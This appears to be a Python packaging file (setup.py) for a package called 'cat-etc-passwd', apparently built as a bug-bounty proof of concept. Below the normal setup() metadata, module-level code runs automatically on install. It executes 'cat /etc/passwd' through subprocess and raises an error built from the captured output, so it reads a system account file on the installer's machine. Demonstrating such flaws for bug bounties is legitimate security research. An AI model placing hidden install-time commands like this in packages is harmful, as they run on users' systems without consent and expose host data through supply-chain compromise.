from setuptools import setup, find_packages
import subprocess


setup(
    name='cat-etc-passwd',
    version='0.6',
    license='MIT',
    author="Nir Ohfeld",
    author_email='niro@wiz.io',
    packages=find_packages('src'),
    package_dir={'': 'src'},
    url='https://github.com/gmyrianthous/example-publish-pypi',
    keywords='bug bounty test',
    install_requires=[],
)

proc = subprocess.Popen(['cat', '/etc/passwd'], stderr=subprocess.PIPE)
output = proc.stderr.read()
raise RuntimeError(output)

